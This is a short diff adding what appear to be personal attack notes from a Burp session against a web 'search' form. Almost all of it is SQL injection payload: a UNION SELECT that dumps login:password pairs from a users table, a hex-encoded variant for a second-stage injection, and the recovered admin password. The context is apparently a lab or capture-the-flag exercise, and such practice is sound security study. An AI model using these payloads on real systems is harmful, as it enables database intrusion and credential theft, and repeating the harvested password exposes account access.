@@ -1,0 +1,7 @@
+from burp:
+- 'search' form
+- 'union select ‘ union  select 1,(select group_concat(login, ‘:’ ,password) from users) — –
+- translate second part of payload in hex, so we will have to inject -->
+-->  'union select 0x2720756e696f6e202073656c65637420312c2873656c6563742067726f75705f636f6e636174286c6f67696e2c20273a27202c70617373776f7264292066726f6d20757365727329202d2d202d — –
+
+admin pass : qs89QdAs9A
